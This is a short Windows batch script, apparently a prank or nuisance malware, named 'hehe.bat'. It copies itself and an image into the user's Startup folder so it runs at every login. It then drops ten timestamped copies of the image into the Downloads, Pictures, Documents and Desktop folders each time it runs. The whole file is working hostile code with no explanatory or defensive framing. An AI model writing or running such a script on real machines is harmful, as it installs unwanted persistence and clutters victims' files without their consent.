@echo off
Xcopy /I /Y .\hehe.bat %AppData%\Microsoft\Windows\Start Menu\Programs\Startup\
Xcopy /I /Y .\hehe.jpg %AppData%\Microsoft\Windows\Start Menu\Programs\Startup\
set rmcolon=%time::=%
set rmcomma=%rmcolon:,=%
FOR /L %%A IN (1,1,10) DO (
	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Downloads\hehe"%%A""%rmcomma%".jpg*
	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Pictures\hehe"%%A""%rmcomma%".jpg*
	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Documents\hehe"%%A""%rmcomma%".jpg*	
	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Desktop\hehe"%%A""%rmcomma%".jpg*
)


